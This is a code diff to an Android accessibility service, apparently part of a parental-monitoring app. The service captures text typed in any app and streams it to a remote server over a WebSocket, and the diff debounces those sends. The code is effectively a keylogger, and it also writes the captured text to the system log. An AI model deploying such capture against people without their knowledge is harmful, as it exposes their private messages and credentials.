@@ -40,6 +40,9 @@ class ParentalAccessibilityService : AccessibilityService(), AgentWebSocketClien
     private var usageStatsMonitor: UsageStatsMonitor? = null
     private var lastPackage: String? = null
     private var lastTypedText: String? = null
+    private var pendingTypingRunnable: Runnable? = null
+    private var pendingTypingPkg: String? = null
+    private var pendingTypingText: String? = null
     private var isLiveActive = false
     private val mainHandler = Handler(Looper.getMainLooper())
     private val executor = Executors.newSingleThreadExecutor()
@@ -121,15 +124,24 @@ class ParentalAccessibilityService : AccessibilityService(), AgentWebSocketClien
                 val text = if (!textList.isNullOrEmpty()) textList.joinToString(" ").trim() else ""
                 if (text.isNotEmpty() && text != lastTypedText) {
                     lastTypedText = text
-                    val typingJson = JSONObject().apply {
-                        put("type", "typing")
-                        put("app", pkg)
-                        put("title", lastPackage ?: pkg)
-                        put("text", text)
-                        put("ts", nowIso)
+                    pendingTypingPkg = pkg
+                    pendingTypingText = text
+
+                    pendingTypingRunnable?.let { mainHandler.removeCallbacks(it) }
+                    pendingTypingRunnable = Runnable {
+                        val sendPkg = pendingTypingPkg ?: pkg
+                        val sendText = pendingTypingText ?: text
+                        val typingJson = JSONObject().apply {
+                            put("type", "typing")
+                            put("app", sendPkg)
+                            put("title", lastPackage ?: sendPkg)
+                            put("text", sendText)
+                            put("ts", isoFormat.format(Date()))
+                        }
+                        wsClient?.send(typingJson)
+                        Log.i("ParentalAccService", "Texto consolidado enviado en $sendPkg: $sendText")
                     }
-                    wsClient?.send(typingJson)
-                    Log.i("ParentalAccService", "Texto capturado en $pkg: $text")
+                    mainHandler.postDelayed(pendingTypingRunnable!!, 1000L)
                 }
             }
         }
